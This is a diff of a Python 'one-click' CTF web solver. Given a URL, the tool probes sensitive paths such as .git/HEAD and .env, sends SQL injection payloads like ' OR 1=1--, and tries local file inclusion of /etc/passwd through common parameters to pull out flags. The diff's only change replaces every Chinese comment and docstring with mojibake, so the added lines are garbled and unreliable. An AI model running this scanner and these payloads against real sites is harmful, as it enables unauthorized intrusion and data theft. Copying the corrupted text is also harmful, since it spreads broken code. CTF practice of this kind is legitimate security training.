@@ -1,4 +1,4 @@
-"""CTF Web 一键解题引擎 — 输入 URL 自动探测并尝试提取 flag."""
+"""CTF Web ä¸é®è§£é¢å¼æ â è¾å¥ URL èªå¨æ¢æµå¹¶å°è¯æå flag."""
 
 from __future__ import annotations
 
@@ -7,7 +7,7 @@ import sys
 import io
 import threading
 
-# 用标准库做 HTTP
+# ç¨æ ååºå HTTP
 import urllib.request
 import urllib.error
 import urllib.parse
@@ -15,7 +15,7 @@ import ssl
 import socket
 
 FLAG_PATTERNS = [
-    re.compile(r'[A-Za-z]{4}\{[^}]+\}'),  # 任意4字母{} 如 ABCD{xxx}
+    re.compile(r'[A-Za-z]{4}\{[^}]+\}'),  # ä»»æ4å­æ¯{} å¦ ABCD{xxx}
     re.compile(r'flag\{[^}]+\}', re.IGNORECASE),
     re.compile(r'ISCC\{[^}]+\}'),
     re.compile(r'ctf\{[^}]+\}', re.IGNORECASE),
@@ -23,7 +23,7 @@ FLAG_PATTERNS = [
 
 
 def solve_web(url: str, progress_callback=None) -> dict:
-    """对 URL 发起自动探测，返回结果.
+    """å¯¹ URL åèµ·èªå¨æ¢æµï¼è¿åç»æ.
 
     Returns:
         {
@@ -44,7 +44,7 @@ def solve_web(url: str, progress_callback=None) -> dict:
     if not url.startswith(("http://", "https://")):
         url = "http://" + url
 
-    # ── 1. 基本请求 ──
+    # ââ 1. åºæ¬è¯·æ± ââ
     log("HTTP GET", "running", url)
     try:
         req = urllib.request.Request(url, headers=_headers())
@@ -61,41 +61,41 @@ def solve_web(url: str, progress_callback=None) -> dict:
         log("HTTP GET", "fail", str(e)[:200])
         return {"success": False, "flag": None, "results": results}
 
-    # 尝试解码
+    # å°è¯è§£ç 
     body = _decode_body(body_raw, content_type) if body_raw else ""
     log("HTTP GET", "ok", f"status={status}, len={len(body_raw)}, server={server}")
 
-    # ── 2. 检查页面自带的 flag ──
+    # ââ 2. æ£æ¥é¡µé¢èªå¸¦ç flag ââ
     f = _find_flag(body)
     if f:
         log("Flag Found", "flag!", f)
         return {"success": True, "flag": f, "results": results}
 
-    # ── 3. 扫描敏感路径 ──
+    # ââ 3. æ«æææè·¯å¾ ââ
     dir_result = _scan_dirs(url, ctx)
     log("Dir Scan", "ok" if dir_result else "none", f"checked {len(DIR_LIST)} paths")
     for r in dir_result:
         log(f"  {r['path']}", r['status'], r.get('detail', ''))
 
-    # ── 4. PHP 信息泄露路径 ──
+    # ââ 4. PHP ä¿¡æ¯æ³é²è·¯å¾ ââ
     leak_flag = _try_leak_paths(url, ctx)
     if leak_flag:
         log("Leak Path", "flag!", leak_flag)
         return {"success": True, "flag": leak_flag, "results": results}
 
-    # ── 5. 尝试简单 SQL 注入 ──
+    # ââ 5. å°è¯ç®å SQL æ³¨å¥ ââ
     sql_flag = _try_sqli(url, ctx)
     if sql_flag:
         log("SQL Injection", "flag!", sql_flag)
         return {"success": True, "flag": sql_flag, "results": results}
 
-    # ── 6. 尝试 LFI ──
+    # ââ 6. å°è¯ LFI ââ
     lfi_flag = _try_lfi(url, ctx)
     if lfi_flag:
         log("LFI", "flag!", lfi_flag)
         return {"success": True, "flag": lfi_flag, "results": results}
 
-    # ── 总结 ──
+    # ââ æ»ç» ââ
     log("Result", "none", "no flag found")
     return {"success": False, "flag": None, "results": results}
 
@@ -144,7 +144,7 @@ def _http_get(url, ctx):
         return None, b""
 
 
-# ── 目录扫描 ──
+# ââ ç®å½æ«æ ââ
 DIR_LIST = [
     "robots.txt", ".git/HEAD", ".env", ".DS_Store", "backup.zip",
     "admin/", "login.php", "admin.php", "config.php", "db.php",
@@ -174,7 +174,7 @@ def _scan_dirs(base_url, ctx):
     return found
 
 
-# ── 信息泄露路径 ──
+# ââ ä¿¡æ¯æ³é²è·¯å¾ ââ
 LEAK_PATHS = [
     ("/robots.txt", None),
     ("/.git/HEAD", None),
@@ -200,7 +200,7 @@ def _try_leak_paths(base_url, ctx):
     return None
 
 
-# ── 简单 SQL 注入 ──
+# ââ ç®å SQL æ³¨å¥ ââ
 SQLI_PAYLOADS = [
     "' OR '1'='1",
     "' OR 1=1--",
@@ -212,7 +212,7 @@ SQLI_PAYLOADS = [
 
 
 def _try_sqli(base_url, ctx):
-    """尝试在 URL 参数 / POST 中注入."""
+    """å°è¯å¨ URL åæ° / POST ä¸­æ³¨å¥."""
     parsed = urllib.parse.urlparse(base_url)
     path = parsed.path or "/"
     if parsed.query:
@@ -231,7 +231,7 @@ def _try_sqli(base_url, ctx):
     return None
 
 
-# ── LFI ──
+# ââ LFI ââ
 LFI_PATHS = [
     "/etc/passwd",
     "/etc/hosts",
@@ -245,7 +245,7 @@ def _try_lfi(base_url, ctx):
     parsed = urllib.parse.urlparse(base_url)
     path = parsed.path or "/"
 
-    # 尝试 file= / page= / include= 参数
+    # å°è¯ file= / page= / include= åæ°
     for param in ["file", "page", "include", "path", "template", "view", "document"]:
         for lfi_path in LFI_PATHS[:3]:
             test_url = f"{parsed.scheme}://{parsed.netloc}{path}?{param}={urllib.parse.quote(lfi_path)}"
@@ -255,7 +255,7 @@ def _try_lfi(base_url, ctx):
                 f = _find_flag(text)
                 if f:
                     return f
-                # 如果读到了 passwd，说明 LFI 可用
+                # å¦æè¯»å°äº passwdï¼è¯´æ LFI å¯ç¨
                 if "root:" in text:
                     return f"LFI confirmed on {param}, try deeper traversal"
     return None
